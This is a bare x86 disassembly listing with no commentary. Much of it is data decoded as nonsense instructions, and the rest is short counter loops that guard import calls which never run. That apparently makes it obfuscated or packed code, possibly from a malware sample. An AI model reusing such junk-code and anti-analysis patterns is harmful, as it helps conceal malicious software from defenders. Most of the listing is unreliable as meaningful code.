  40edbe:	addr16 hlt 
  40edc0:	xor    esi,esi
  40edc2:	sub    edi,DWORD PTR [esi+0x4e]
  40edc5:	push   es
  40edc6:	cmc    
  40edc7:	ins    BYTE PTR es:[edi],dx
  40edc8:	imul   BYTE PTR [edi]
  40edca:	mov    ebx,0xa15cc3f7
  40edcf:	adc    esi,esp
  40edd1:	leave  
  40edd2:	pop    ss
  40edd3:	jb     0x40ee4b
  40edd5:	loopne 0x40ee40
  40edd7:	adc    bl,BYTE PTR [edx]
  40edd9:	repnz fadd DWORD PTR [eax+0x7558cd80]
  40ede0:	out    dx,eax
  40ede1:	or     eax,0xe0c3d457
  40ede6:	pop    ds
  40ede7:	dec    ebx
  40ede8:	pop    es
  40ede9:	jmp    FWORD PTR [eax]
  40edeb:	push   ecx
  40edec:	ins    DWORD PTR es:[edi],dx
  40eded:	popa   
  40edee:	xor    edx,DWORD PTR [ebp-0x32f4c320]
  40edf4:	push   edi
  40edf5:	loope  0x40ee31
  40edf7:	(bad)  
  40edf8:	int3   
  40edf9:	jg     0x40ed95
  40edfb:	fdiv   QWORD PTR [edi+0x28]
  40edfe:	sar    DWORD PTR [esi],0xb3
  40ee01:	mov    ch,0x45
  40ee03:	(bad)  
  40ee04:	mov    dl,BYTE PTR [ecx-0x73]
  40ee07:	fwait
  40ee08:	mov    ds:0xc0be690d,al
  40ee0d:	or     eax,0x31227e2f
  40ee12:	out    dx,al
  40ee13:	sub    BYTE PTR [edx-0x68],0xe5
  40ee17:	mov    ecx,0x27c74dfe
  40ee1c:	add    ebp,DWORD PTR [ecx]
  40ee1e:	and    DWORD PTR [edi+0x9ae64ba],esi
  40ee24:	ins    DWORD PTR es:[edi],dx
  40ee25:	inc    esi
  40ee26:	sub    eax,0xb549682d
  40ee2b:	push   ebp
  40ee2c:	dec    ebx
  40ee2d:	mov    esi,DWORD PTR [edi+0x69]
  40ee30:	shl    DWORD PTR [edx+edx*1],1
  40ee33:	test   dl,dh
  40ee35:	stos   DWORD PTR es:[edi],eax
  40ee36:	imul   edi,eax,0xe2b91fa9
  40ee3c:	mov    ds:0xdb63716d,eax
  40ee41:	or     bl,ah
  40ee43:	aaa    
  40ee44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee45:	ins    BYTE PTR es:[edi],dx
  40ee46:	cld    
  40ee47:	in     eax,dx
  40ee48:	fist   DWORD PTR [edi+ebx*8-0x5f]
  40ee4c:	stos   DWORD PTR es:[edi],eax
  40ee4d:	jo     0x40edd3
  40ee4f:	xor    edi,DWORD PTR [ecx-0xe5edc9d]
  40ee55:	add    ebx,DWORD PTR [esi+0xe]
  40ee58:	scas   eax,DWORD PTR es:[edi]
  40ee59:	jae    0x40eec9
  40ee5b:	outs   dx,DWORD PTR ds:[esi]
  40ee5d:	or     al,0x53
  40ee5f:	mov    ?,ebx
  40ee61:	imul   ebp,DWORD PTR [esi+0x22],0xe341d6cb
  40ee68:	mov    edx,ss
  40ee6a:	gs pusha 
  40ee6c:	adc    al,0x99
  40ee6e:	mov    eax,ds:0xa9c1840
  40ee73:	add    ch,BYTE PTR [ebx+0x7071d444]
  40ee79:	mov    dh,0x40
  40ee7b:	inc    ecx
  40ee7c:	rcr    BYTE PTR [edi],0x67
  40ee7f:	and    al,0xbc
  40ee81:	xor    esp,DWORD PTR [edi-0x5074b246]
  40ee87:	and    BYTE PTR [ebx+0x33],al
  40ee8a:	imul   DWORD PTR [ecx-0x60dd587]
  40ee90:	jnp    0x40ee24
  40ee92:	jmp    0xbe90:0x6f679f04
  40ee99:	push   0x7c46d0d7
  40ee9e:	icebp  
  40ee9f:	stos   DWORD PTR es:[edi],eax
  40eea0:	or     edi,ebx
  40eea2:	jge    0x40eefe
  40eea4:	sub    ch,BYTE PTR [ebx+0x3fd26a70]
  40eeaa:	mov    ecx,0x2e3f2fac
  40eeaf:	mov    DWORD PTR ds:0x1202fd42,ecx
  40eeb5:	retf   
  40eeb6:	sub    al,0x28
  40eeb8:	mov    esp,0x4767af0a
  40eebd:	test   cl,dl
  40eebf:	adc    DWORD PTR [esi*1-0x5f798e95],edi
  40eec6:	mov    WORD PTR [ebx+0x22a1f523],ss
  40eecc:	std    
  40eecd:	aad    0xd6
  40eecf:	icebp  
  40eed0:	or     DWORD PTR [edx],0x65
  40eed3:	sbb    ecx,0x70bf9ac0
  40eed9:	lods   al,BYTE PTR ds:[esi]
  40eeda:	dec    ebp
  40eedb:	mov    ah,0x2b
  40eedd:	sbb    ecx,DWORD PTR [ebp+0x29]
  40eee0:	sbb    BYTE PTR [ecx-0x6906722d],al
  40eee6:	mov    ah,BYTE PTR [ecx]
  40eee8:	jns    0x40ee7a
  40eeea:	lahf   
  40eeeb:	xor    DWORD PTR [ebx-0x53614232],edi
  40eef1:	aas    
  40eef2:	jp     0x40eecc
  40eef4:	mul    BYTE PTR [ebp-0x77db5726]
  40eefa:	and    dh,BYTE PTR [eax+0x5dd9890]
  40ef00:	ror    BYTE PTR [esi],0xd9
  40ef03:	inc    edi
  40ef04:	(bad)  
  40ef05:	fst    DWORD PTR [ecx+0x18f4d2c4]
  40ef0b:	int3   
  40ef0c:	push   esi
  40ef0d:	jno    0x40ef34
  40ef0f:	mov    ebx,0xb377a1eb
  40ef14:	fld    TBYTE PTR [ecx+0x7b]
  40ef17:	sahf   
  40ef18:	daa    
  40ef19:	mov    ebp,0x4a7a80a
  40ef1e:	popa   
  40ef1f:	dec    ebx
  40ef20:	nop
  40ef21:	xchg   edi,eax
  40ef22:	scas   eax,DWORD PTR es:[edi]
  40ef23:	daa    
  40ef24:	sbb    ebx,DWORD PTR [esi+0x252f7818]
  40ef2a:	in     al,0xd0
  40ef2c:	cmp    BYTE PTR [edx-0x7f],0x87
  40ef30:	sbb    eax,0x9e9e10a5
  40ef35:	lods   al,BYTE PTR ds:[esi]
  40ef36:	adc    BYTE PTR [ebx+0x42d8a2b3],ch
  40ef3c:	fmul   QWORD PTR [ecx-0xe]
  40ef3f:	and    BYTE PTR [eax+ebp*2+0x57fb96bb],cl
  40ef46:	shl    DWORD PTR [edx-0x5e43b8d6],1
  40ef4c:	fdivr  DWORD PTR [edi-0x7da0633c]
  40ef52:	push   esp
  40ef53:	es retf 0xf43
  40ef57:	out    dx,eax
  40ef58:	mov    bh,0xf7
  40ef5a:	sbb    eax,0x2f96a403
  40ef5f:	sub    eax,0x1c5dbc24
  40ef64:	int3   
  40ef65:	push   ss
  40ef66:	push   edx
  40ef67:	repnz push esp
  40ef69:	repz xchg ebx,eax
  40ef6b:	iret   
  40ef6c:	cmp    BYTE PTR [edx],bl
  40ef6e:	sub    cl,ah
  40ef70:	push   esi
  40ef71:	jmp    0xbc5836d3
  40ef76:	inc    edi
  40ef77:	stos   BYTE PTR es:[edi],al
  40ef78:	je     0x40ef03
  40ef7a:	(bad)  
  40ef7b:	icebp  
  40ef7c:	xor    al,0x35
  40ef7e:	xchg   edx,eax
  40ef7f:	cld    
  40ef80:	mov    al,ds:0x6e815b96
  40ef85:	aad    0xb3
  40ef87:	bound  ebp,QWORD PTR [ebp+0x1bf2e47c]
  40ef8d:	inc    ebp
  40ef8e:	pop    ebp
  40ef8f:	ss xor eax,0xd7d3dd55
  40ef95:	xor    bh,BYTE PTR [ebx-0x6ebc7f1f]
  40ef9b:	ins    BYTE PTR es:[edi],dx
  40ef9c:	jne    0x40ef23
  40ef9e:	jg     0x40efd8
  40efa0:	neg    BYTE PTR [ebx]
  40efa2:	outs   dx,DWORD PTR fs:[esi]
  40efa4:	inc    esp
  40efa5:	int3   
  40efa6:	je     0x40efa6
  40efa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa9:	ret    
  40efaa:	jge    0x40ef84
  40efac:	inc    ebx
  40efad:	xchg   ecx,eax
  40efae:	jle    0x40f009
  40efb0:	test   eax,0x1571c792
  40efb5:	pop    eax
  40efb6:	lock xchg DWORD PTR [edi+0x6defd007],ecx
  40efbd:	push   0xffffffe8
  40efbf:	add    al,0xcd
  40efc1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efc4:	pop    esp
  40efc5:	pusha  
  40efc6:	add    eax,0xa017f069
  40efcb:	xchg   esp,eax
  40efcc:	adc    eax,0xec47917c
  40efd1:	jne    0x40ef7e
  40efd3:	push   ebp
  40efd4:	jmp    0x40f029
  40efd6:	sub    dl,BYTE PTR [ecx-0x59c3803a]
  40efdc:	push   0x5d
  40efde:	(bad)  
  40efdf:	cli    
  40efe0:	frndint 
  40efe2:	sti    
  40efe3:	loop   0x40f03f
  40efe5:	test   dh,ah
  40efe7:	push   ss
  40efe8:	or     al,0xc6
  40efea:	fistp  WORD PTR [esi+0x78]
  40efed:	sbb    eax,0xe6136c85
  40eff2:	jo     0x40efca
  40eff4:	push   ecx
  40eff5:	xchg   edi,eax
  40eff6:	xor    DWORD PTR [eax],esp
  40eff8:	adc    BYTE PTR [ebp-0xb80fa7],ah
  40effe:	cli    
  40efff:	icebp  
  40f000:	nop
  40f001:	mov    edi,DWORD PTR [ebx]
  40f003:	fldz   
  40f005:	inc    ebx
  40f006:	sub    eax,0x7212fb84
  40f00b:	push   ds
  40f00c:	mov    ecx,0x7d5b9eec
  40f011:	ins    DWORD PTR es:[edi],dx
  40f012:	stos   BYTE PTR es:[edi],al
  40f013:	call   0x81f8:0x55896078
  40f01a:	and    eax,0x42a821
  40f01f:	add    BYTE PTR [eax],al
  40f021:	add    BYTE PTR [eax],al
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a821
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a821,edi
  40f032:	cmp    DWORD PTR ds:0x42a821,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a821,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a821
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a821,edi
  40f066:	cmp    DWORD PTR ds:0x42a821,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a8ad,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a8ad
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a8ad,edi
  40f08f:	cmp    DWORD PTR ds:0x42a8ad,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a825
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a8ad,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a779,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0xe6
  40f0d7:	xchg   BYTE PTR [ebx+0x78bcced7],ch
  40f0dd:	js     0x40f0c4
  40f0df:	jle    0x40f159
  40f0e1:	js     0x40f15f
  40f0e3:	mov    bl,0x99
  40f0e5:	ss aad 0xe5
  40f0e8:	mov    ss,WORD PTR [esi-0x6c3876cc]
  40f0ee:	stos   BYTE PTR es:[edi],al
  40f0ef:	xchg   ebp,eax
  40f0f0:	cld    
  40f0f1:	aas    
  40f0f2:	test   BYTE PTR [esp+ebp*4-0x28],dh
  40f0f6:	arpl   WORD PTR [edi+0x2fc94d93],ax
  40f0fc:	xor    ebx,DWORD PTR [ebx+0x32078fe5]
  40f102:	push   cs
  40f103:	in     eax,dx
  40f104:	xchg   ebp,eax
  40f105:	fwait
  40f106:	sbb    cl,0x28
  40f109:	loop   0x40f162
  40f10b:	(bad)
  40f10f:	adc    eax,0xa460a6a8
  40f114:	push   cs
  40f115:	jmp    0x40f18d
  40f117:	cmp    ah,BYTE PTR [esi+0x5d]
  40f11a:	arpl   WORD PTR [esi+0x1cf2db3f],ax
  40f120:	std    
  40f121:	sti    
  40f122:	mov    esp,0xab4a00d2
  40f127:	popa   
  40f128:	in     eax,0xf1
  40f12a:	call   0x74ef:0xc8ac0290
  40f131:	pop    ebp
  40f132:	(bad)  
  40f133:	cld    
  40f134:	call   0xb66c:0x3861c2db
  40f13b:	in     eax,0xc3
  40f13d:	jne    0x40f140
  40f13f:	jne    0x40f15a
  40f141:	add    al,BYTE PTR [ecx]
  40f143:	mov    cl,BYTE PTR [esi+0x73]
  40f146:	cmp    DWORD PTR [eax],edx
  40f148:	add    al,0x1b
  40f14a:	or     dh,bh
  40f14c:	sar    DWORD PTR [esi+0x2c],1
  40f14f:	adc    bl,cl
  40f151:	nop
  40f152:	dec    esi
  40f153:	xchg   esi,eax
  40f154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f155:	pop    edi
  40f156:	lods   al,BYTE PTR ds:[esi]
  40f157:	push   0xffffff9c
  40f159:	jb     0x40f18d
  40f15b:	rcr    BYTE PTR [eax],cl
  40f15d:	out    dx,al
  40f15e:	or     DWORD PTR [esi],0xf9877658
  40f164:	and    dl,BYTE PTR [edx-0x4ec64321]
  40f16a:	repnz push cs
  40f16c:	aad    0x98
  40f16e:	cwde   
  40f16f:	push   ebp
  40f170:	int3   
  40f171:	hlt    
  40f172:	inc    ebp
  40f173:	pusha  
  40f174:	xchg   DWORD PTR [edi],eax
  40f176:	mov    ebx,0x1274d75b
  40f17b:	add    DWORD PTR [esi+0x179a853f],ecx
  40f181:	mov    ebp,DWORD PTR [edi]
  40f183:	ss out dx,al
  40f185:	add    al,0x73
  40f187:	inc    esp
  40f188:	ud1    edx,ebx
  40f18b:	aas    
  40f18c:	call   0x4df0:0x3269e295
  40f193:	nop
  40f194:	mov    ebp,0x685d128f
  40f199:	mov    ds:0x92a529f3,al
  40f19e:	or     eax,0xd79d0381
  40f1a3:	mov    esp,0x2a344d18
  40f1a8:	pop    ebp
  40f1a9:	test   eax,0xdb317e96
  40f1ae:	pop    ds
  40f1af:	ret    
  40f1b0:	stos   DWORD PTR es:[edi],eax
  40f1b1:	shl    BYTE PTR [esi-0x1a7276f1],0xc4
  40f1b8:	xchg   BYTE PTR [ebx-0x10],al
  40f1bb:	or     DWORD PTR [ecx],edx
  40f1bd:	xor    BYTE PTR [edi-0x6d],al
  40f1c0:	dec    edx
  40f1c1:	cmp    al,0xc2
  40f1c3:	fbstp  TBYTE PTR ds:0x800faf71
  40f1c9:	and    bh,BYTE PTR [eax+0x232b8d09]
  40f1cf:	rcr    BYTE PTR [esi-0x4b],1
  40f1d2:	sub    DWORD PTR ds:0x4f6dda53,0xfffffff1
  40f1d9:	sub    BYTE PTR [edx+0x16920687],bh
  40f1df:	lods   eax,DWORD PTR ds:[esi]
  40f1e0:	pop    esi
  40f1e1:	rol    bl,0x93
  40f1e4:	test   BYTE PTR [esi],dh
  40f1e6:	mov    ch,0xed
  40f1e8:	in     eax,dx
  40f1e9:	fisttp QWORD PTR [esi]
  40f1eb:	push   ds
  40f1ec:	push   eax
  40f1ed:	fstp   QWORD PTR [esi-0x771f7fb7]
  40f1f3:	repz fwait
  40f1f5:	pop    ebp
  40f1f6:	(bad)  
  40f1f7:	fdivr  QWORD PTR [eax]
  40f1f9:	ror    BYTE PTR ds:0xf982f88b,cl
  40f1ff:	push   ecx
  40f200:	out    0x1e,eax
  40f202:	test   DWORD PTR [ebx-0x32],ebp
  40f205:	and    al,0x69
  40f207:	pusha  
  40f208:	and    ecx,0x2ea4574d
  40f20e:	push   ss
  40f20f:	jg     0x40f1fd
  40f211:	push   edx
  40f212:	inc    BYTE PTR [edi-0x68b439d8]
  40f218:	adc    DWORD PTR [edi],0x1e
  40f21b:	push   ebx
  40f21c:	(bad)  
  40f21d:	cmp    ebp,DWORD PTR [eax-0x2f216709]
  40f223:	stc    
  40f224:	and    bh,ch
  40f226:	dec    eax
  40f227:	add    DWORD PTR [ebp-0x5a],0x39
  40f22b:	inc    esi
  40f22c:	mov    dh,0x5c
  40f22e:	js     0x40f293
  40f230:	in     al,0xa5
  40f232:	xor    BYTE PTR [eax],bl
  40f234:	push   esp
  40f235:	sbb    eax,0xb3435840
  40f23a:	fld    DWORD PTR [esi-0x73]
  40f23d:	jno    0x40f1e7
  40f23f:	add    dl,BYTE PTR [ebx-0x68]
  40f242:	lods   eax,DWORD PTR ds:[esi]
  40f243:	popf   
  40f244:	mov    ecx,0x8eed9794
  40f249:	jmp    0xaebd127d
  40f24e:	lock pop edx
  40f250:	inc    esp
  40f251:	lods   eax,DWORD PTR ds:[esi]
  40f252:	inc    BYTE PTR [edi]
  40f254:	push   es
  40f255:	cld    
  40f256:	push   ss
  40f257:	std    
  40f258:	jbe    0x40f2a5
  40f25a:	inc    esi
  40f25b:	iret   
  40f25c:	loopne 0x40f220
  40f25e:	cmp    al,0x77
  40f260:	jae    0x40f2b1
  40f262:	dec    ecx
  40f263:	call   0x3684:0x5b3b8cb4
  40f26a:	aam    0x5b
  40f26c:	test   eax,0x22aa0e14
  40f271:	fwait
  40f272:	mov    ds:0xfe946d6b,al
  40f277:	sub    DWORD PTR [ebx-0xf9f38fd],edx
  40f27d:	leave  
  40f27e:	rcr    cl,1
  40f280:	xchg   al,bh
  40f282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f283:	stos   DWORD PTR es:[edi],eax
  40f284:	mov    ds:0xd93b9e3,eax
  40f289:	push   ds
  40f28a:	loop   0x40f2f5
  40f28c:	loope  0x40f2f6
  40f28e:	enter  0x8eed,0x2e
  40f292:	xor    ebp,DWORD PTR ds:0xb127a2b
  40f298:	xchg   BYTE PTR [eax],ah
  40f29a:	cld    
  40f29b:	jno    0x40f236
  40f29d:	xor    dh,BYTE PTR [eax+0x29]
  40f2a0:	push   ss
  40f2a1:	add    ebx,edi
  40f2a3:	pop    edx
  40f2a4:	loopne 0x40f301
  40f2a6:	es inc esi
  40f2a8:	fnstcw WORD PTR [ebx+0x5cd3edf6]
  40f2ae:	mov    dl,0xa7
  40f2b0:	pop    ecx
  40f2b1:	push   edx
  40f2b2:	imul   ebx,DWORD PTR [edx-0x1889ef89],0x6
  40f2b9:	loope  0x40f240
  40f2bb:	jge    0x40f2ee
  40f2bd:	xor    eax,0xfe71bfcc
  40f2c2:	aad    0x7
  40f2c4:	adc    BYTE PTR [edx],cl
  40f2c6:	fisttp WORD PTR cs:[ebx-0x3b]
  40f2ca:	cmp    cl,bl
  40f2cc:	test   eax,0xcde02776
  40f2d1:	adc    edx,DWORD PTR [ecx-0x781e63d1]
  40f2d7:	inc    ebp
  40f2d8:	hlt    
  40f2d9:	bound  esp,QWORD PTR [eax+0x1da5f724]
  40f2df:	cmp    al,0x25
  40f2e1:	xchg   DWORD PTR [ebp+ecx*4-0x9a0bcf3],edi
  40f2e8:	add    DWORD PTR [ebp+0x63],esp
  40f2eb:	push   ebx
  40f2ec:	cs std 
  40f2ee:	push   cs
  40f2ef:	addr16 sbb ebp,ebx
  40f2f2:	push   edx
  40f2f3:	loop   0x40f357
  40f2f5:	js     0x40f2b6
  40f2f7:	sub    esi,DWORD PTR [eax]
  40f2f9:	jl     0x40f30b
  40f2fb:	(bad)  
  40f2fc:	out    dx,al
  40f2fd:	pop    esi
  40f2fe:	shl    BYTE PTR [esi],cl
  40f300:	mul    DWORD PTR [edx-0x5d]
  40f303:	mov    bh,0x89
  40f305:	push   ecx
  40f306:	sub    ecx,DWORD PTR [ecx+0x1fb8c0c4]
  40f30c:	ret    
  40f30d:	int3   
  40f30e:	shr    DWORD PTR [ebx+0x36904710],cl
  40f314:	nop
  40f315:	cmp    al,0x84
  40f317:	jge    0x40f2c5
  40f319:	pop    ebp
  40f31a:	push   esp
  40f31b:	push   ss
  40f31c:	test   eax,0x8642680e
  40f321:	xchg   ecx,eax
  40f322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f323:	dec    esi
  40f324:	enter  0xbed1,0x6e
  40f328:	adc    BYTE PTR [edi],dl
  40f32a:	mov    bh,0xe5
  40f32c:	jecxz  0x40f392
  40f32e:	push   eax
  40f32f:	fisubr WORD PTR [eax-0x60]
  40f332:	loopne 0x40f379
  40f334:	mov    dl,BYTE PTR [ecx]
  40f336:	adc    ch,BYTE PTR [ebx+0x5c]
  40f339:	outs   dx,DWORD PTR ds:[esi]
  40f33a:	(bad)  
  40f33b:	push   edi
  40f33c:	mov    dh,0x15
  40f33e:	mov    ds:0x40c74781,eax
  40f343:	rol    cl,0x9f
  40f346:	divps  xmm5,xmm0
  40f349:	mov    cl,0xb9
  40f34b:	mov    WORD PTR [eax],fs
  40f34d:	add    edx,ecx
  40f34f:	mov    DWORD PTR ds:0x42a82d,0x1d
  40f359:	cmp    DWORD PTR ds:0x42a82d,0x0
  40f360:	je     0x40f3c3
  40f366:	cmp    DWORD PTR ds:0x42a82d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a82d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a82d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a82d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a82d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a82d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a779
  40f3bd:	add    DWORD PTR ds:0x42a795,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a789
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a861,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a861
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a861,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a861,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a861,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a899
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a795,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a829,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a829
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a829,edx
  40f477:	cmp    DWORD PTR ds:0x42a829,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a829,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7e9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7e9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7e9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7e9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7e9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a861,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a861
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a861,edi
  40f528:	cmp    DWORD PTR ds:0x42a861,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a861,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7ed
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a851,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	sar    DWORD PTR [ebp-0x4c],0x75
  40f574:	dec    ecx
  40f575:	mov    ebx,0xe5787842
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f572
  40f57e:	in     al,0x5c
  40f580:	cmc    
  40f581:	inc    edi
  40f582:	aad    0xa6
  40f584:	shl    ch,1
  40f586:	jne    0x40f5c2
  40f588:	push   ecx
  40f589:	js     0x40f55e
  40f58b:	cwde   
  40f58c:	addr16 add dl,ah
  40f58f:	push   0x38
  40f591:	adc    eax,0xee215a29
  40f596:	mov    BYTE PTR [eax+edx*8+0x27],ch
  40f59a:	pushf  
  40f59b:	xchg   ch,dh
  40f59d:	ins    BYTE PTR es:[edi],dx
  40f59e:	das    
  40f59f:	call   0x2b5cb1ed
  40f5a4:	rol    BYTE PTR [ebx+0x3dd4c679],0x3b
  40f5ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5ac:	push   es
  40f5ad:	call   0x4eb5:0x80bbfec2
  40f5b4:	out    dx,eax
  40f5b5:	shl    BYTE PTR ds:0x5a1d2d67,cl
  40f5bb:	ror    BYTE PTR [ecx+0x6174c98],cl
  40f5c1:	xchg   esi,eax
  40f5c2:	mov    ds:0x56f22f04,eax
  40f5c7:	ja     0x40f5d6
  40f5c9:	xchg   ecx,eax
  40f5ca:	mov    edi,0xb11cb71f
  40f5cf:	or     al,0xc1
  40f5d1:	mov    ds:0x3e4844ac,al
  40f5d6:	or     esp,DWORD PTR [esi]
  40f5d8:	mov    cl,0x43
  40f5da:	pusha  
  40f5db:	jns    0x40f648
  40f5dd:	call   ebp
  40f5df:	test   cl,0x55
  40f5e2:	rcl    DWORD PTR [esi-0x4bed0aef],0xe
  40f5e9:	dec    DWORD PTR [esi+0xc6a2208]
  40f5ef:	pop    esi
  40f5f0:	stos   DWORD PTR es:[edi],eax
  40f5f1:	inc    ecx
  40f5f2:	dec    ebx
  40f5f3:	push   cs
  40f5f4:	lds    ebp,FWORD PTR [edx]
  40f5f6:	xchg   esp,eax
  40f5f7:	mov    ?,WORD PTR [edi]
  40f5f9:	mov    edx,0xe259509b
  40f5fe:	addr16 (bad) 
  40f600:	aaa    
  40f601:	and    al,0x19
  40f603:	ror    BYTE PTR [esi+0x6d],0xee
  40f607:	adc    ecx,esi
  40f609:	neg    DWORD PTR [ebp+0x3a2dfaf4]
  40f60f:	mov    BYTE PTR [ebp+0x7a],bh
  40f612:	add    DWORD PTR [edx+ebp*8+0x71],ebp
  40f616:	imul   esp,DWORD PTR [ebp-0x76a770d5],0xbfea31a4
  40f620:	pop    ebx
  40f621:	mov    ah,0xc6
  40f623:	rol    ah,0x23
  40f626:	and    al,0x1d
  40f628:	xchg   dh,cl
  40f62a:	and    edi,DWORD PTR cs:[eax]
  40f62d:	leave  
  40f62e:	(bad)  
  40f62f:	and    BYTE PTR [ecx-0xd],dl
  40f632:	mov    esi,0xe5ee9b51
  40f637:	and    DWORD PTR [ecx],eax
  40f639:	jmp    0x14c4:0x431a5b60
  40f640:	mov    BYTE PTR [eax],0x37
  40f643:	dec    esp
  40f644:	inc    ebp
  40f645:	test   eax,0x8e5de733
  40f64a:	mov    esp,0x353d4981
  40f64f:	ficomp WORD PTR [ebx]
  40f651:	mov    ch,0xb7
  40f653:	in     eax,dx
  40f654:	jb     0x40f677
  40f656:	out    0x6,al
  40f658:	out    dx,al
  40f659:	xchg   esi,eax
  40f65a:	fild   QWORD PTR fs:[eax+0x4459ccd8]
  40f661:	dec    edx
  40f662:	pop    ebp
  40f663:	pop    ebx
  40f664:	imul   esp,DWORD PTR [ebx],0x17448c78
  40f66a:	dec    ecx
  40f66b:	lods   al,BYTE PTR ds:[esi]
  40f66c:	aam    0x7a
  40f66e:	pop    esp
  40f66f:	arpl   ax,bx
  40f671:	cmp    edi,DWORD PTR [edi+0x59]
  40f674:	sub    al,0xaf
  40f676:	mov    WORD PTR [ebp+eiz*2+0x32],es
  40f67a:	in     eax,0x4c
  40f67c:	pop    ss
  40f67d:	pushf  
  40f67e:	mov    eax,0xfeebb10b
